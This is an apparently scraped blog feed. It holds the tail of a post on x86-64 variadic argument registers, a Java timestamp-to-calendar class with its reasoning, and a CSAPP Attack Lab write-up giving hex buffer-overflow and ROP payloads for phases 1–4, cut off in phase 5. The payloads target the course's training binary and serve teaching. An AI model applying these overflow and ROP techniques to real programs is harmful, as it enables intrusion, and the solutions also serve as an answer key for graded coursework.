arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee’s responsibility to dump arguments that have their address taken. <strong>For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers.</strong></p></blockquote></li><li><p>按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，<strong>比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。</strong>这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。</p></li><li><p>这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）</p></li></ul>]]></content>
    
    <summary type="html">
    
      x86-64体系下的传参方式使得可变参数的传递出现了一些特别的情况
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="printf" scheme="https://h-zex.github.io/tags/printf/"/>
    
      <category term="操作系统" scheme="https://h-zex.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="底层" scheme="https://h-zex.github.io/tags/%E5%BA%95%E5%B1%82/"/>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>从时间戳（毫秒）计算日历</title>
    <link href="https://h-zex.github.io/2017/10/02/%E4%BB%8E%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%88%E6%AF%AB%E7%A7%92%EF%BC%89%E8%AE%A1%E7%AE%97%E6%97%A5%E5%8E%86/"/>
    <id>https://h-zex.github.io/2017/10/02/从时间戳（毫秒）计算日历/</id>
    <published>2017-10-02T08:58:15.000Z</published>
    <updated>2018-08-04T04:48:35.589Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> year;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> month;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> day;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hour;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> minute;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> second;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerSecond = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerMinute = <span class="number">1000</span>*<span class="number">60</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerHour = <span class="number">3600</span>*<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerDay = <span class="number">24</span>*<span class="number">3600</span>*<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerPingNian = <span class="number">365</span>*timePerDay;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePerLeapYear = <span class="number">366</span>*timePerDay;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timeOf1970And1971 = timePerPingNian+timePerPingNian;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timePer4Year = (<span class="keyword">long</span>)(<span class="number">365.25</span>*<span class="number">4</span>*timePerDay);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timeEvery400Year = timePer4Year*<span class="number">100</span> - <span class="number">3</span>*timePerDay;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">long</span> timeOf1970To2000 = timePer4Year*<span class="number">7</span>+timeOf1970And1971;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span>[] daysPerMonth = &#123;<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setMinuteAndSecond</span><span class="params">(<span class="keyword">long</span> milliTime)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> milliTime&lt;timePerDay;</span><br><span class="line">        <span class="keyword">if</span>(milliTime&gt;=timePerDay)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        hour = (<span class="keyword">int</span>)(milliTime/timePerHour);</span><br><span class="line">        <span class="keyword">long</span> t = milliTime%timePerHour;</span><br><span class="line">        minute = (<span class="keyword">int</span>)(t/timePerMinute);</span><br><span class="line">        t = t%timePerMinute;</span><br><span class="line">        second = (<span class="keyword">int</span>)(t/timePerSecond);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setMonthAndDay</span><span class="params">(<span class="keyword">long</span> milliTime, <span class="keyword">boolean</span> isLeapYear)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//this func should handle  the case where milliTime == 0;</span></span><br><span class="line">        <span class="comment">//this func get the milliseconds within 1 year;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> milliTime&lt;=timePerLeapYear &amp;&amp; isLeapYear || milliTime&lt;=timePerPingNian &amp;&amp; !isLeapYear;</span><br><span class="line">        <span class="keyword">if</span>(milliTime&gt;timePerLeapYear &amp;&amp; isLeapYear || milliTime&gt;timePerPingNian &amp;&amp; !isLeapYear) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        daysPerMonth[<span class="number">1</span>] = isLeapYear ? <span class="number">29</span> : <span class="number">28</span>; <span class="comment">//set the days of February;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> cnt = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            milliTime -= daysPerMonth[++cnt]*timePerDay;</span><br><span class="line">        &#125;<span class="keyword">while</span> (milliTime&gt;=<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        month = cnt+<span class="number">1</span>;  <span class="comment">//for that the cnt begin from 0, but month begin from 1;</span></span><br><span class="line">        <span class="keyword">long</span> timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime;</span><br><span class="line">        day = (<span class="keyword">int</span>)(timeOfLastMonth/timePerDay)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        setMinuteAndSecond(timeOfLastMonth % timePerDay);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setDataFile</span><span class="params">(<span class="keyword">long</span> milliTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(milliTime&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> is1970Or1971 = milliTime&lt;timeOf1970And1971 ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">boolean</span> is20Century = milliTime&lt;timeOf1970To2000 ? <span class="keyword">true</span>: <span class="keyword">false</span>; </span><br><span class="line">       <span class="comment">//if equal is 2000 1 1 0:0:0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(is1970Or1971) &#123;</span><br><span class="line">            year = milliTime&gt;=timePerPingNian ? <span class="number">1971</span> : <span class="number">1970</span>;</span><br><span class="line">            setMonthAndDay(year==<span class="number">1971</span> ? milliTime-timePerPingNian : milliTime, <span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(is20Century) &#123;</span><br><span class="line">            <span class="keyword">long</span> t = (milliTime-timeOf1970And1971)/timePer4Year;  </span><br><span class="line">            <span class="keyword">long</span> t1 = milliTime-timeOf1970And1971-t*timePer4Year;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> t2 = t1-timePerLeapYear;</span><br><span class="line">            <span class="keyword">boolean</span> isLeapYear = t2&lt;<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">long</span> t3 = isLeapYear ? <span class="number">0</span> : t2/timePerPingNian+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            year = (<span class="keyword">int</span>)(<span class="number">1972</span>+t*<span class="number">4</span>+t3);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">long</span> l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay);</span><br><span class="line">            setMonthAndDay(l, isLeapYear);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> p = milliTime-timeOf1970To2000;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> t1 = p/timeEvery400Year;</span><br><span class="line">        <span class="keyword">long</span> p1 = p-t1*timeEvery400Year;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> t2 = p1/timePer4Year;</span><br><span class="line">        <span class="keyword">long</span> tN = t2/<span class="number">25</span>;    </span><br><span class="line">      <span class="comment">//in every 400 years, other year such as xy00(y!=0) is not leap year;</span></span><br><span class="line">        </span><br><span class="line">      <span class="keyword">long</span> p2 = p1-t2*timePer4Year;</span><br><span class="line">        p2 += tN*timePerDay;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> t3 = p2-timePerLeapYear;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> isLeapYear = t3&lt;<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> t4 = isLeapYear ? <span class="number">0</span> : t3/timePerPingNian+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        year = (<span class="keyword">int</span>)(<span class="number">2000</span>+t1*<span class="number">400</span>+t2*<span class="number">4</span>+t4);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay);</span><br><span class="line">        setMonthAndDay(lt, isLeapYear);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="设置时分秒（函数setMinuteAndSecond）"><a href="#设置时分秒（函数setMinuteAndSecond）" class="headerlink" title="设置时分秒（函数setMinuteAndSecond）"></a>设置时分秒（函数setMinuteAndSecond）</h4><ul><li>函数的输入是 小于 每天毫秒数  的一个整数</li><li>因为是从0:0:0开始计时，所以很好算</li><li>直接除以每小时毫秒数，结果就是 要求的小时数</li><li>然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数</li><li>以此类推，算出秒数</li></ul><h4 id="设置月和日（函数setMonthAndDay）"><a href="#设置月和日（函数setMonthAndDay）" class="headerlink" title="设置月和日（函数setMonthAndDay）"></a>设置月和日（函数setMonthAndDay）</h4><ul><li>函数的输入为  小于  每年毫秒数  一个整数</li><li>依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。<strong>注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59</strong></li><li>通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始）</li></ul><h4 id="设置年份（在函数setDataFile中）"><a href="#设置年份（在函数setDataFile中）" class="headerlink" title="设置年份（在函数setDataFile中）"></a>设置年份（在函数setDataFile中）</h4><ul><li><p>对1970/1971特殊处理，直接判断是否毫秒数是否 $\geq$ 一个平年的毫秒数，如果是，那么就是1971。<strong>注意，等于也是，原因如上所述。</strong>然后调用setMonthAndDay函数，设置日月</p></li><li><p>对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。</p><p>然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$</p></li><li><p>然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$</p><p>接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$</p><p>接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$</p><p>接下来调用setMonthAndDay函数设置月份日期</p></li></ul>]]></content>
    
    <summary type="html">
    
      从时间戳（毫秒）计算日历
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="时间戳" scheme="https://h-zex.github.io/tags/%E6%97%B6%E9%97%B4%E6%88%B3/"/>
    
      <category term="日历" scheme="https://h-zex.github.io/tags/%E6%97%A5%E5%8E%86/"/>
    
      <category term="算法" scheme="https://h-zex.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Attack Lab</title>
    <link href="https://h-zex.github.io/2017/09/16/CSAPP-Attack-Lab/"/>
    <id>https://h-zex.github.io/2017/09/16/CSAPP-Attack-Lab/</id>
    <published>2017-09-16T05:18:56.000Z</published>
    <updated>2018-08-04T04:48:35.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-Attack-Lab"><a href="#CSAPP-Attack-Lab" class="headerlink" title="CSAPP Attack Lab"></a>CSAPP Attack Lab</h1><blockquote><p>本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符</p></blockquote><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line"><span class="comment">/* this five lines fill the buf */</span></span><br><span class="line"></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* touch1's addr */</span></span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上<code>touch1</code>的地址（直接用十六进制写），然后用<code>hex2raw</code>转换后输入即可AC</li></ul><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* touch2的地址 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span> <span class="number">83</span> ec <span class="number">30</span></span><br><span class="line"><span class="comment">/* sub  $0x30, %rsp */</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> </span><br><span class="line"><span class="comment">/* mov  $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/</span></span><br><span class="line"></span><br><span class="line">c3 <span class="comment">/* retq */</span></span><br><span class="line"></span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa  aa aa aa aa </span><br><span class="line">aa aa aa aa </span><br><span class="line"><span class="comment">/* 填充的字符串 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">80</span> dc <span class="number">61</span> <span class="number">55</span></span><br><span class="line"><span class="comment">/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */</span></span><br></pre></td></tr></table></figure><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ul><li>需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置</li><li>需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址</li></ul><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><h4 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* touch3 addr, in 0x5561dc78 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span> <span class="number">83</span> ec <span class="number">30</span> </span><br><span class="line"><span class="comment">/* sub $0x30,%rsp, in 0x5561dc80 */</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span> c7 c7 <span class="number">90</span> dc <span class="number">61</span> <span class="number">55</span> </span><br><span class="line"><span class="comment">/* mov  $0x5561dc90,%rdi */</span></span><br><span class="line"></span><br><span class="line">c3 </span><br><span class="line"><span class="comment">/* retq will ret to 0x5561dc78 */</span>   </span><br><span class="line"></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/*fill the extra space */</span></span><br><span class="line"></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span><span class="number">00</span></span><br><span class="line"><span class="comment">/* string "59b997fa" ，in 0x5561dc90 */</span></span><br><span class="line"></span><br><span class="line">aa aa aa aa aa aa aa </span><br><span class="line"><span class="comment">/* fill the extra space */</span> </span><br><span class="line"></span><br><span class="line"><span class="number">80</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* 0x5561dc80, our code's begin addr */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* just before our attack code is run, </span></span><br><span class="line"><span class="comment">* rsp == 0x5561dca0 </span></span><br><span class="line"><span class="comment">* return addr in 0x5561dca0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ul><li>比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串</li><li>然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80</li><li>接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶</li></ul><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><h4 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa </span><br><span class="line">aa aa aa aa aa aa aa aa </span><br><span class="line">aa aa aa aa aa aa aa aa </span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line"><span class="comment">/* this five line fill the buf */</span></span><br><span class="line"></span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 0x4019cc pop %rax; nop; ret */</span></span><br><span class="line"></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 0x59b997fa */</span></span><br><span class="line"></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* 0x4019a2 movq %rax, %rdi; ret */</span></span><br><span class="line"></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* touch2 0x4017ec */</span></span><br></pre></td></tr></table></figure><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ul><li>构造rop链，在0x4019ca处有<code>b8 29 58 90 c3 mov $0xc3905829,%eax</code>，观察字节码，在0x4019cc处的<code>58</code>是<code>pop rax</code>，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax</li><li>在0x4019a0有<code>8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax</code>，观察字节码，0x4019a2处有<code>48 89 c7</code>，也就是<code>mov %rax, %rdi</code>，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了</li></ul><h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><h4 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line">aa aa aa aa aa aa aa aa</span><br><span class="line"><span class="comment">/* this five lines fill space of buf */</span></span><br><span class="line"></span><br><span class="line"><span class="number">17</span> <span class="number">2b</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="comment">/* 402b17, pop rsi,ret to this, assume that rsp is K */</span></span><br><span class="line"></span><br><span class="line"><span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">/* the data pop to rsi */</span></span><br><span class="line"></span><br><span class="line"><span 